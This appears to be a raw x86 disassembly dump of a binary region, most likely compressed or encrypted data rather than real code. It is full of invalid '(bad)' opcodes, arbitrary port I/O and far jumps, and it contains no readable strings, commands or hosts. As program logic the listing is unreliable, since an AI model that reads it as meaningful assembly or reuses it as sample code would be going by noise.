  41bf0a:	dec    esi
  41bf0b:	and    al,0xde
  41bf0d:	push   ebp
  41bf0e:	pop    edi
  41bf0f:	int    0xe1
  41bf11:	aas    
  41bf12:	loop   0x41bf22
  41bf14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf15:	and    eax,0x91803130
  41bf1a:	pop    ebx
  41bf1b:	out    dx,al
  41bf1c:	test   al,0x4
  41bf1e:	dec    esp
  41bf1f:	xchg   esp,eax
  41bf20:	sbb    edx,DWORD PTR [esi+0x756d6672]
  41bf26:	push   esp
  41bf27:	(bad)  
  41bf28:	push   ecx
  41bf29:	mov    eax,ds:0xd760ec9a
  41bf2e:	ss out dx,al
  41bf30:	mov    ebp,0x285529cb
  41bf35:	(bad)  
  41bf36:	call   0xf0f274f0
  41bf3b:	dec    esi
  41bf3c:	fcmovne st,st(0)
  41bf3e:	push   eax
  41bf3f:	imul   edi,DWORD PTR [eax],0xffffff8d
  41bf42:	mov    bh,0x77
  41bf44:	cmp    ecx,ebp
  41bf46:	mov    ch,0xe7
  41bf48:	mov    ebp,0xc022da27
  41bf4d:	jb     0x41bf0b
  41bf4f:	xchg   ecx,eax
  41bf50:	xor    BYTE PTR [edx+ebx*4],ch
  41bf53:	(bad)  
  41bf54:	(bad)  [eax+0x35ac82f2]
  41bf5a:	fisttp WORD PTR [edx+0xc]
  41bf5d:	shl    ch,0x60
  41bf60:	mov    ax,0xbac2
  41bf64:	cwde   
  41bf65:	inc    edi
  41bf66:	aad    0x2
  41bf68:	jne    0x41bf38
  41bf6a:	jl     0x41bfa9
  41bf6c:	xchg   ebx,eax
  41bf6d:	mov    al,ds:0x3432888a
  41bf72:	fisubr DWORD PTR [ebx+0x65]
  41bf75:	sbb    al,0x82
  41bf77:	cmp    DWORD PTR [eax],ecx
  41bf79:	xlat   BYTE PTR ds:[ebx]
  41bf7a:	daa    
  41bf7b:	mov    esi,0x9269ac4f
  41bf80:	test   BYTE PTR [edi+0x71c36e7a],0x3e
  41bf87:	mov    dl,0xd7
  41bf89:	icebp  
  41bf8a:	out    0x5d,eax
  41bf8c:	adc    cl,BYTE PTR [edx+eax*4-0x26]
	...
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	push   0x3430af26
  41c005:	sub    DWORD PTR [ecx],eax
  41c007:	add    BYTE PTR [ecx+eax*1],al
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	ror    DWORD PTR [ebx-0x2ddda4c7],0x96
  41c013:	mov    ds:0x8d1aea4c,eax
  41c018:	sbb    ebx,DWORD PTR [edx-0x3845e2f3]
  41c01e:	xor    eax,0xcd6b6faf
  41c023:	fld    QWORD PTR [esi]
  41c025:	fisubr DWORD PTR [edi+0x10]
  41c028:	and    dl,BYTE PTR [edx]
  41c02a:	inc    DWORD PTR [esi+0x6221f7b0]
  41c030:	dec    ecx
  41c031:	inc    esi
  41c032:	nop
  41c033:	cld    
  41c034:	and    eax,DWORD PTR [esi*4-0x175146d7]
  41c03b:	imul   ecx,DWORD PTR [edx],0x24e3fdb0
  41c041:	cmp    esi,DWORD PTR [esi+0x1f]
  41c044:	jne    0x41c035
  41c046:	pop    eax
  41c047:	mov    eax,ds:0xb424ddbe
  41c04c:	and    DWORD PTR [esp+edx*4],edx
  41c04f:	mov    WORD PTR [ecx],fs
  41c051:	ins    BYTE PTR es:[edi],dx
  41c052:	scas   al,BYTE PTR es:[edi]
  41c053:	std    
  41c054:	or     al,0x51
  41c056:	xor    BYTE PTR [eax],bh
  41c058:	jle    0x41c0d3
  41c05a:	inc    ebx
  41c05b:	mov    bh,0xcc
  41c05d:	xlat   BYTE PTR ds:[ebx]
  41c05e:	dec    edi
  41c05f:	xchg   DWORD PTR cs:[esi],edx
  41c062:	mov    edi,0x1921b8f7
  41c067:	inc    ebp
  41c068:	popa   
  41c069:	out    0xfe,eax
  41c06b:	popf   
  41c06c:	jl     0x41c0d4
  41c06e:	pop    ebx
  41c06f:	mov    DWORD PTR [ebx-0xe],0x8828651c
  41c076:	loopne 0x41bffc
  41c078:	push   eax
  41c079:	push   eax
  41c07a:	adc    eax,0xfe82ee5a
  41c07f:	outs   dx,BYTE PTR ds:[esi]
  41c080:	es loope 0x41c085
  41c083:	push   ss
  41c084:	add    BYTE PTR [edi-0x72],0x80
  41c088:	scas   eax,DWORD PTR es:[edi]
  41c089:	dec    edi
  41c08a:	inc    esp
  41c08b:	xor    BYTE PTR [eax],ah
  41c08d:	cmp    ebx,DWORD PTR [ecx+ebx*8-0x6a]
  41c091:	xchg   esi,eax
  41c092:	mov    ds:0x3201e19b,eax
  41c097:	(bad)  
  41c099:	ror    bh,1
  41c09b:	sar    BYTE PTR [eax-0x67],0xb
  41c09f:	lahf   
  41c0a0:	fisubr DWORD PTR [ecx]
  41c0a2:	sbb    DWORD PTR [ebx+0x22],eax
  41c0a5:	and    BYTE PTR ds:0xca78fb3e,bh
  41c0ab:	pop    ebx
  41c0ac:	std    
  41c0ad:	jbe    0x41c0f4
  41c0af:	cld    
  41c0b0:	cmc    
  41c0b1:	mov    ds:0x3f23efd6,eax
  41c0b6:	and    eax,0x77435006
  41c0bb:	icebp  
  41c0bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0bd:	dec    edx
  41c0be:	cs dec edi
  41c0c0:	pop    edx
  41c0c1:	sbb    eax,0x3f412f35
  41c0c6:	ja     0x41c104
  41c0c8:	sub    al,0x7
  41c0ca:	mov    ds:0xc6fa8f79,eax
  41c0cf:	mov    esp,0x795afb7c
  41c0d4:	int3   
  41c0d5:	out    dx,al
  41c0d6:	loopne 0x41c098
  41c0d8:	pop    ecx
  41c0d9:	mov    dl,0xcf
  41c0db:	lods   al,BYTE PTR ds:[esi]
  41c0dc:	and    bl,BYTE PTR [ebx]
  41c0de:	sub    eax,0xd0905793
  41c0e3:	pop    edx
  41c0e4:	das    
  41c0e5:	jno    0x41c14f
  41c0e7:	push   edx
  41c0e8:	dec    esi
  41c0e9:	add    ah,BYTE PTR [edx+0x61]
  41c0ec:	fstp   TBYTE PTR [ebx]
  41c0ee:	fnstcw WORD PTR [esp+edx*2]
  41c0f1:	sbb    DWORD PTR [esi+eiz*2-0x3e0599a8],esp
  41c0f8:	inc    esi
  41c0f9:	xchg   edx,eax
  41c0fa:	stc    
  41c0fb:	addr16 inc eax
  41c0fd:	shl    DWORD PTR [ebx-0xd],0xf5
  41c101:	js     0x41c105
  41c103:	lahf   
  41c104:	and    eax,0x747c525
  41c109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c10a:	adc    DWORD PTR cs:[eax],ebx
  41c10d:	mov    ch,0x4e
  41c10f:	dec    eax
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x7fcf7e9,eax
  41c183:	push   ebx
  41c184:	cmp    BYTE PTR [edx],ch
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	jl     0x41c15b
  41c18e:	aaa    
  41c18f:	stc    
  41c190:	cli    
  41c191:	sbb    cl,cl
  41c193:	mov    edi,0x36c223d6
  41c198:	icebp  
  41c199:	mov    BYTE PTR [eax],bh
  41c19b:	mov    ch,bh
  41c19d:	retf   
  41c19e:	loopne 0x41c1b1
  41c1a0:	jb     0x41c1be
  41c1a2:	xchg   edx,eax
  41c1a3:	or     DWORD PTR [edi+0x597172ab],ebp
  41c1a9:	sbb    edi,DWORD PTR [ecx+0x4ed9a8ec]
  41c1af:	inc    esi
  41c1b0:	push   esi
  41c1b1:	clc    
  41c1b2:	cmp    DWORD PTR [esi],ebp
  41c1b4:	(bad)  
  41c1b5:	jmp    0x9ddc:0xe16bcc7c
  41c1bc:	mov    ebp,0x4725aa41
  41c1c1:	dec    ebp
  41c1c2:	or     al,0xd0
  41c1c4:	call   0xa57e:0xb036fb47
  41c1cb:	adc    ecx,DWORD PTR [ecx-0x15]
  41c1ce:	inc    esi
  41c1cf:	scas   al,BYTE PTR es:[edi]
  41c1d0:	xchg   esi,eax
  41c1d1:	sbb    BYTE PTR [edx-0x53],bl
  41c1d4:	popf   
  41c1d5:	sub    BYTE PTR [ecx*1+0x1517ea71],bh
  41c1dc:	mov    BYTE PTR [edi+ebx*1],dh
  41c1df:	dec    esi
  41c1e0:	inc    esi
  41c1e1:	adc    al,0xa2
  41c1e3:	or     DWORD PTR [edi-0x1a],eax
  41c1e6:	int3   
  41c1e7:	fwait
  41c1e8:	or     al,bl
  41c1ea:	mov    cl,0x40
  41c1ec:	mov    ds:0xf8cffbb1,al
  41c1f1:	arpl   WORD PTR [eax+eiz*4-0xe],dx
  41c1f5:	frstor [edi]
  41c1f7:	(bad)  
  41c1f8:	adc    DWORD PTR [eax+0x4ee30b95],esp
  41c1fe:	mov    ebx,0x9b5200f2
  41c203:	adc    ecx,DWORD PTR [eax-0xcb0404d]
  41c209:	enter  0x74f2,0x7d
  41c20d:	ret    
  41c20e:	jmp    0xedd0:0x2dc36384
  41c215:	fdivr  st,st(2)
  41c217:	adc    dl,0x7c
  41c21a:	stc    
  41c21b:	mov    ebp,0x312a6bf8
  41c220:	stos   BYTE PTR es:[edi],al
  41c221:	(bad)  
  41c222:	push   0xf54b5ff0
  41c227:	clc    
  41c228:	in     al,0x3d
  41c22a:	pop    esp
  41c22b:	fwait
  41c22c:	xlat   BYTE PTR ds:[ebx]
  41c22d:	sbb    DWORD PTR [ebp+edi*8-0x8220a3c],ecx
  41c234:	in     al,dx
  41c235:	mov    ds:0x15bcc999,al
  41c23a:	out    0x99,al
  41c23c:	xchg   edx,eax
  41c23d:	in     al,0xd5
  41c23f:	call   0x2d3de1de
  41c244:	aaa    
  41c245:	xor    dl,bl
  41c247:	les    edx,FWORD PTR [ebp+0x3b]
  41c24a:	sub    BYTE PTR [ecx-0x5712fbd4],cl
  41c250:	pop    edi
  41c251:	sub    cl,cl
  41c253:	and    BYTE PTR [esi+0x37],cl
  41c256:	push   edi
  41c257:	inc    edi
  41c258:	std    
  41c259:	cwde   
  41c25a:	into   
  41c25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c25c:	jb     0x41c1fd
  41c25e:	mov    ah,0xe
  41c260:	jecxz  0x41c2a6
  41c262:	ins    BYTE PTR es:[edi],dx
  41c263:	inc    ecx
  41c264:	fst    QWORD PTR [ebx+0x11]
  41c267:	mov    esp,0x555c6ed0
  41c26c:	mov    dl,0x7b
  41c26e:	sub    DWORD PTR [edi+0x3da63af3],eax
  41c274:	cs ds enter 0x29df,0x21
  41c27a:	dec    ebx
  41c27b:	sbb    BYTE PTR [edi+0xd9ce391],ah
  41c281:	repnz xchg esp,eax
  41c283:	fs xchg cl,bh
  41c286:	les    ebx,FWORD PTR [ebp-0x5fddaa6b]
  41c28c:	adc    eax,0x2e43a8
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	mov    ah,0x1
  41c302:	adc    BYTE PTR [edx+0x12b3c],dl
  41c308:	add    al,0x1
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	mov    ebx,0x200390bd
  41c311:	sub    DWORD PTR [eax-0x4aa74b7a],0xffffffdf
  41c318:	jno    0x41c2b5
  41c31a:	sbb    al,0x1
  41c31c:	or     al,0xbf
  41c31e:	test   al,0x73
  41c320:	and    BYTE PTR [esi-0x2c],ah
  41c323:	repz mov esi,0xa962df05
  41c329:	test   BYTE PTR [edi],0x8b
  41c32c:	mov    bl,0x34
  41c32e:	xchg   DWORD PTR [ebx-0x42d5aff0],edi
  41c334:	xchg   edx,edx
  41c336:	adc    ebp,DWORD PTR [edx+0x53]
  41c339:	push   ebx
  41c33a:	sti    
  41c33b:	xor    ebx,0x45e35976
  41c341:	mov    dh,0xb
  41c343:	fs pop edx
  41c345:	jbe    0x41c344
  41c347:	fdivr  st,st(4)
  41c349:	add    al,0x39
  41c34b:	dec    ebx
  41c34c:	cli    
  41c34d:	cmp    dh,BYTE PTR [edi+0x72724861]
  41c353:	xchg   edi,eax
  41c354:	stos   DWORD PTR es:[edi],eax
  41c355:	and    al,BYTE PTR [esi]
  41c357:	add    BYTE PTR [ebx+0x45878462],bh
  41c35d:	and    al,0x5d
  41c35f:	jge    0x41c2fa
  41c361:	push   ds
  41c362:	call   0xd4a23715
  41c367:	gs jmp 0xdf9d:0xd0bf1692
  41c36f:	add    ch,BYTE PTR ds:0x9aa08006
  41c375:	fdivr  st(4),st
  41c377:	xor    al,0xfd
  41c379:	mov    dl,0xa8
  41c37b:	pop    ecx
  41c37c:	cli    
  41c37d:	call   0x9ae4:0x7754dea0
  41c384:	push   cs
  41c385:	mov    bl,dl
  41c387:	(bad)  
  41c389:	imul   eax,DWORD PTR [edx],0xffffffd8
  41c38c:	out    dx,al
  41c38d:	out    dx,eax
  41c38e:	xor    DWORD PTR [eax],0x52bf26f3
  41c394:	adc    edx,DWORD PTR [ecx+0x1]
  41c397:	sahf   
  41c398:	pop    esp
  41c399:	xchg   ebp,eax
  41c39a:	dec    esp
  41c39b:	or     cl,BYTE PTR [ebp+ecx*2-0x1fb853f2]
  41c3a2:	jp     0x41c361
  41c3a4:	mov    edi,0x2cb18415
  41c3a9:	lock cwde 
  41c3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3ac:	pop    ebx
  41c3ad:	jmp    0x41c3cb
  41c3af:	dec    esp
  41c3b0:	data16 arpl ax,sp
  41c3b3:	mov    bh,0xa9
  41c3b5:	int    0x9e
  41c3b7:	lods   eax,DWORD PTR ds:[esi]
  41c3b8:	sub    eax,0x3150f8b5
  41c3bd:	in     eax,dx
  41c3be:	adc    ebp,DWORD PTR [ebx]
  41c3c0:	rcr    dl,0x31
  41c3c3:	lea    eax,[ecx+ebp*4-0x79]
  41c3c7:	cli    
  41c3c8:	sub    eax,0xe4a5a4d5
  41c3cd:	shr    BYTE PTR ds:0xb6df3a8f,0xcd
  41c3d4:	out    0x2f,al
  41c3d6:	or     al,0xa5
  41c3d8:	gs jecxz 0x41c36a
  41c3db:	(bad)  
  41c3dc:	mov    ecx,0xb72b57e2
  41c3e1:	mov    esp,ebp
  41c3e3:	mov    esp,DWORD PTR [eax-0x67]
  41c3e6:	cmp    al,0xbd
  41c3e8:	and    BYTE PTR [si+0x2],bl
  41c3ec:	aad    0xde
  41c3ee:	jg     0x41c3d1
  41c3f0:	stos   DWORD PTR es:[edi],eax
  41c3f1:	(bad)  
  41c3f2:	test   al,0xe0
  41c3f4:	xlat   BYTE PTR ds:[ebx]
  41c3f5:	sub    esi,DWORD PTR [edx-0x49]
  41c3f8:	mov    esi,edx
  41c3fa:	xlat   BYTE PTR ds:[ebx]
  41c3fb:	mov    ebp,0x784db809
  41c400:	test   eax,0xee1af368
  41c405:	mov    BYTE PTR [ecx-0x69],al
  41c408:	xor    bh,al
  41c40a:	icebp  
  41c40b:	mov    edi,0xabf9dad
	...
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	sbb    DWORD PTR ds:0x2c40ae33,ebp
  41c486:	add    DWORD PTR [eax],eax
  41c488:	add    al,0x1
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	xchg   esp,eax
  41c48d:	or     bh,BYTE PTR [esi]
  41c48f:	and    dh,BYTE PTR [edi]
  41c491:	int    0xfd
  41c493:	add    al,0xf1
  41c495:	call   DWORD PTR [ecx+0x45db7446]
  41c49b:	int3   
  41c49c:	aas    
  41c49d:	inc    edx
  41c49e:	mov    edx,0xf881f02a
  41c4a3:	addr16 stc 
  41c4a5:	jge    0x41c4f6
  41c4a7:	xchg   edx,eax
  41c4a8:	idiv   BYTE PTR [esi]
  41c4aa:	das    
  41c4ab:	jmp    0x41c4b6
  41c4ad:	push   esp
  41c4ae:	push   ecx
  41c4af:	ficom  WORD PTR ds:0x24d7d5c
  41c4b5:	mov    eax,0x70d6841
  41c4ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4bb:	sbb    edi,DWORD PTR [edx+0x20528e27]
  41c4c1:	cld    
  41c4c2:	lds    edx,FWORD PTR [eax+0x278329d6]
  41c4c8:	push   edi
  41c4c9:	out    dx,eax
  41c4ca:	jno    0x41c4b5
  41c4cc:	add    DWORD PTR [edi],ecx
  41c4ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4cf:	jle    0x41c4c8
  41c4d1:	mov    bl,0xd1
  41c4d3:	mov    edx,0x53d5aa5c
  41c4d8:	iret   
  41c4d9:	push   cs
  41c4da:	sar    BYTE PTR [edx-0x616ea1d5],0x5d
  41c4e1:	bound  eax,QWORD PTR [edi+edx*1]
  41c4e4:	push   es
  41c4e5:	loope  0x41c512
  41c4e7:	out    dx,eax
  41c4e8:	and    eax,0x59d310b1
  41c4ed:	jl     0x41c47d
  41c4ef:	push   0x41349066
  41c4f4:	outs   dx,BYTE PTR ds:[esi]
  41c4f5:	mov    bh,0x5
  41c4f7:	into   
  41c4f8:	add    ecx,DWORD PTR [eax]
  41c4fa:	lock and ebx,DWORD PTR cs:[ebp-0x45]
  41c4ff:	and    DWORD PTR [ebp+edi*8-0x38ba9d2],ecx
  41c506:	push   0xacfc8e32
  41c50b:	js     0x41c558
  41c50d:	add    al,0x79
  41c50f:	(bad)  
  41c510:	sub    eax,0x1102d37d
  41c515:	leave  
  41c516:	je     0x41c4db
  41c518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c519:	xor    bh,BYTE PTR [eax-0x41]
  41c51c:	xor    esi,DWORD PTR [edi+0x34]
  41c51f:	aas    
  41c520:	pop    es
  41c521:	mov    ebx,0xc296ee0c
  41c526:	pop    ebp
  41c527:	lahf   
  41c528:	(bad)  
  41c529:	xchg   esi,eax
  41c52a:	xor    bl,0x71
  41c52d:	enter  0x92c2,0x3c
  41c531:	pop    edx
  41c532:	cmp    edx,eax
  41c534:	dec    eax
  41c535:	daa    
  41c536:	jg     0x41c541
  41c538:	push   ebp
  41c539:	cwde   
  41c53a:	je     0x41c568
  41c53c:	mov    esi,DWORD PTR [esp+ebx*4-0x279fa79e]
  41c543:	cmp    bl,ah
  41c545:	mov    BYTE PTR [ebx],ah
  41c547:	mov    WORD PTR ds:0xf07d1a3d,ss
  41c54d:	jle    0x41c514
  41c54f:	pop    edi
  41c550:	mov    esi,0xdf957766
  41c555:	push   es
  41c556:	fistp  QWORD PTR [edx-0x7e]
  41c559:	pop    esp
  41c55a:	test   BYTE PTR [eax+0x630cbc66],dl
  41c560:	shl    BYTE PTR [ebx+ebx*4],cl
  41c563:	xchg   ebx,eax
  41c564:	test   BYTE PTR [ebx-0x609076],al
  41c56a:	sbb    ch,bh
  41c56c:	sahf   
  41c56d:	shl    ebp,0xe0
  41c570:	mov    cl,0x7f
  41c572:	(bad)  
  41c573:	pushf  
  41c574:	inc    esi
  41c575:	dec    edx
  41c576:	mov    al,0xfa
  41c578:	clc    
  41c579:	push   edi
  41c57a:	dec    esi
  41c57b:	add    BYTE PTR [ecx+0x57],bl
  41c57e:	cdq    
  41c57f:	mov    dl,0x83
  41c581:	aam    0xe8
  41c583:	or     DWORD PTR [edi-0x6cff1244],esp
  41c589:	sahf   
  41c58a:	jnp    0x41c5cc
  41c58c:	jle    0x41c544
  41c58e:	jnp    0x41c574
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0x71c78763
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	mov    edx,DWORD PTR [eax-0x2a7c7081]
  41c612:	xor    DWORD PTR [ebp-0x3a],eax
  41c615:	dec    BYTE PTR [edx+0x15631b8b]
  41c61b:	sbb    DWORD PTR [ecx-0x5fe75946],0xffffffd4
  41c622:	xchg   esi,eax
  41c623:	inc    eax
  41c624:	push   ecx
  41c625:	xchg   esp,eax
  41c626:	push   esp
  41c627:	icebp  
  41c628:	inc    edx
  41c629:	adc    eax,0x8247f73b
  41c62e:	sub    al,ch
  41c630:	std    
  41c631:	outs   dx,BYTE PTR ds:[esi]
  41c632:	test   dl,dh
  41c634:	(bad)  
  41c635:	clc    
  41c636:	scas   eax,DWORD PTR es:[edi]
  41c637:	nop
  41c638:	fwait
  41c639:	push   ds
  41c63a:	pop    es
  41c63b:	mov    ds:0xeb3b83cb,al
  41c640:	jle    0x41c5de
  41c642:	mov    ds:0x6272e1cf,eax
  41c647:	out    dx,eax
  41c648:	aas    
  41c649:	inc    ebx
  41c64a:	dec    ecx
  41c64b:	int    0x5f
  41c64d:	aam    0xe6
  41c64f:	sbb    dh,BYTE PTR ds:0x1cc9abfe
  41c655:	out    0xee,eax
  41c657:	in     al,0x27
  41c659:	mov    DWORD PTR [edx+0x7e],esp
  41c65c:	adc    BYTE PTR [edx+0x4815922d],dl
  41c662:	stc    
  41c663:	std    
  41c664:	xchg   DWORD PTR ds:0xc88064,esi
  41c66a:	add    BYTE PTR [ecx],bl
  41c66c:	call   0xe12c:0xc4c2238b
  41c673:	xlat   BYTE PTR ds:[ebx]
  41c674:	sub    DWORD PTR [edx],eax
  41c676:	sahf   
  41c677:	mov    edi,0x8720595f
  41c67c:	imul   ebp,DWORD PTR [ebx-0x14],0xffffffad
  41c680:	pop    esp
  41c681:	push   ecx
  41c682:	aas    
  41c683:	mov    fs,WORD PTR [ebx+esi*4]
  41c686:	jle    0x41c635
  41c688:	sahf   
  41c689:	pop    ecx
  41c68a:	mov    ebx,DWORD PTR [esi-0x1d]
  41c68d:	sub    ch,BYTE PTR [ebp-0x2dd44121]
  41c693:	pop    edi
  41c694:	and    eax,0x7cc972f5
  41c699:	mov    ss,edx
  41c69b:	clc    
  41c69c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c69d:	stos   DWORD PTR es:[edi],eax
  41c69e:	cmc    
  41c69f:	sub    esi,edx
  41c6a1:	fwait
  41c6a2:	sub    al,0xa6
  41c6a4:	push   es
  41c6a5:	enter  0x4a76,0x60
  41c6a9:	(bad)  
  41c6ab:	loopne 0x41c694
  41c6ad:	out    0x8,al
  41c6af:	push   esi
  41c6b0:	lods   al,BYTE PTR ds:[esi]
  41c6b1:	fwait
  41c6b2:	ret    
  41c6b3:	ret    0x346d
  41c6b6:	in     al,dx
  41c6b7:	nop
  41c6b8:	mov    esi,0x748f8731
  41c6bd:	leave  
  41c6be:	sbb    BYTE PTR [ecx-0x3f],cl
  41c6c1:	and    eax,0xccbf7112
  41c6c6:	(bad)  
  41c6c7:	mov    WORD PTR [esi],cs
  41c6c9:	(bad)  
  41c6ca:	sti    
  41c6cb:	push   es
  41c6cc:	je     0x41c6af
  41c6ce:	scas   eax,DWORD PTR es:[edi]
  41c6cf:	pusha  
  41c6d0:	gs call 0xc0647b2d
  41c6d6:	aam    0xbe
  41c6d8:	mov    ds:0x892ae7c4,al
  41c6dd:	push   ebx
  41c6de:	jmp    0x43eb:0x5376d2ea
  41c6e5:	mov    ch,0x3c
  41c6e7:	jo     0x41c6fe
  41c6e9:	jbe    0x41c700
  41c6eb:	xor    DWORD PTR [ecx-0x6fd8c648],edi
  41c6f1:	inc    esi
  41c6f2:	dec    edi
  41c6f3:	aad    0xdd
  41c6f5:	ja     0x41c6b7
  41c6f7:	enter  0x9775,0x3f
  41c6fb:	and    al,0x73
  41c6fd:	(bad)  
  41c6ff:	(bad)  
  41c700:	mov    ah,0x55
  41c702:	je     0x41c6a4
  41c704:	arpl   WORD PTR [ebx+0x5738d651],cx
  41c70a:	ret    0x940d
  41c70d:	jle    0x41c6c7
  41c70f:	mov    edx,0x0
	...
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	mov    dl,0x81
  41c782:	enter  0x4871,0x2e
  41c786:	add    DWORD PTR [eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	sar    BYTE PTR [ebp+ecx*4-0x475f42fa],cl
  41c793:	push   ebx
  41c794:	loopne 0x41c7a6
  41c796:	mov    al,al
  41c798:	test   BYTE PTR [ecx],ch
  41c79a:	fs aaa 
  41c79c:	mov    ds:0xa3a672b6,eax
  41c7a1:	aad    0x3d
  41c7a3:	and    BYTE PTR [ebp+0x68dfba4e],0xb3
  41c7aa:	add    BYTE PTR [ebp+0x3d],al
  41c7ad:	add    eax,0x9f3ae20d
  41c7b2:	or     DWORD PTR [esi-0x5a5a17bb],esp
  41c7b8:	stc    
  41c7b9:	stc    
  41c7ba:	add    bh,bl
  41c7bc:	xchg   ecx,eax
  41c7bd:	push   es
  41c7be:	cmp    bh,BYTE PTR [ebx+0x1a]
  41c7c1:	mov    esp,0x41ca59cb
  41c7c6:	adc    DWORD PTR [ebp-0x15cab207],0xffffffaf
  41c7cd:	xchg   ebx,eax
  41c7ce:	mov    ?,WORD PTR [ebx]
  41c7d0:	cmp    eax,0x6d819ac8
  41c7d5:	jge    0x41c7b6
  41c7d7:	fimul  DWORD PTR [edi+0x5f]
  41c7da:	adc    esp,ecx
  41c7dc:	push   es
  41c7dd:	mov    ds:0x1738cc3d,eax
  41c7e2:	addr16 or eax,0x46b57adb
  41c7e8:	mov    ah,0xac
  41c7ea:	cmp    eax,0xcf23a474
  41c7ef:	std    
  41c7f0:	stc    
  41c7f1:	in     eax,0x12
  41c7f3:	dec    BYTE PTR [ebx+0xdc2c056]
  41c7f9:	jns    0x41c864
  41c7fb:	int3   
  41c7fc:	mov    bl,0xed
  41c7fe:	dec    edi
  41c7ff:	or     BYTE PTR [ecx-0x5ef0ebb],al
  41c805:	in     al,dx
  41c806:	or     DWORD PTR [eax+0x4a],edi
  41c809:	mov    ecx,0x135fb6d3
  41c80e:	addr16 data16 mov ds:0xd4cb,al
  41c813:	dec    ebx
  41c814:	imul   esp,DWORD PTR [ecx],0xfe5a3341
  41c81a:	cmp    ebx,DWORD PTR [ebp+0xeb75c20]
  41c820:	mul    DWORD PTR ds:0x524b70ed
  41c826:	mov    BYTE PTR [eax],ah
  41c828:	shl    BYTE PTR [eax],cl
  41c82a:	push   cs
  41c82b:	out    dx,al
  41c82c:	in     eax,dx
  41c82d:	ds daa 
  41c82f:	cmc    
  41c830:	ja     0x41c7c8
  41c832:	icebp  
  41c833:	xor    al,0xb3
  41c835:	xor    cl,BYTE PTR [edi+0x7d7c6a6f]
  41c83b:	jno    0x41c7dc
  41c83d:	lea    edi,[eax+0x51015f38]
  41c843:	pop    esp
  41c844:	push   ebp
  41c845:	call   0x5725104a
  41c84a:	sbb    al,0xa5
  41c84c:	pop    es
  41c84d:	lods   al,BYTE PTR ds:[esi]
  41c84e:	jns    0x41c878
  41c850:	mov    ss,WORD PTR [ecx+0x33a19517]
  41c856:	pop    esp
  41c857:	dec    edi
  41c858:	ja     0x41c8ca
  41c85a:	sti    
  41c85b:	xchg   ebx,eax
  41c85c:	mov    esp,0x78aebc60
  41c861:	pop    edx
  41c862:	or     al,0xcc
  41c864:	cmp    ecx,edi
  41c866:	iret   
  41c867:	aas    
  41c868:	loope  0x41c875
  41c86a:	push   es
  41c86b:	or     al,0xbe
  41c86d:	imul   ecx,DWORD PTR [eax-0x4f],0x17
  41c871:	inc    edi
  41c872:	hlt    
  41c873:	hlt    
  41c874:	lods   al,BYTE PTR ds:[esi]
  41c875:	pop    ebp
  41c876:	dec    eax
  41c877:	stc    
  41c878:	arpl   WORD PTR [esi+0x3ef9da03],cx
  41c87e:	js     0x41c810
  41c880:	into   
  41c881:	cmp    BYTE PTR [edi+ebp*4-0x21],dl
  41c885:	sub    al,BYTE PTR [esi]
  41c887:	inc    ecx
  41c888:	mov    edx,0x2558ce8d
  41c88d:	outs   dx,DWORD PTR ds:[esi]
  41c88e:	sbb    eax,0xf7
	...
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	and    dh,BYTE PTR [edi]
  41c902:	pop    ss
  41c903:	repnz dec esp
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c90d:	loope  0x41c8f2
  41c90f:	xchg   DWORD PTR [esi-0x24d0b381],ebp
  41c915:	pop    esp
  41c916:	sbb    eax,0x6e2810a8
  41c91b:	(bad)  
  41c91d:	xchg   ebp,eax
  41c91e:	fyl2xp1 
  41c920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c921:	not    esi
  41c923:	imul   edx,DWORD PTR [eax-0xea4e6db],0x76
  41c92a:	mov    ecx,0xe1665df9
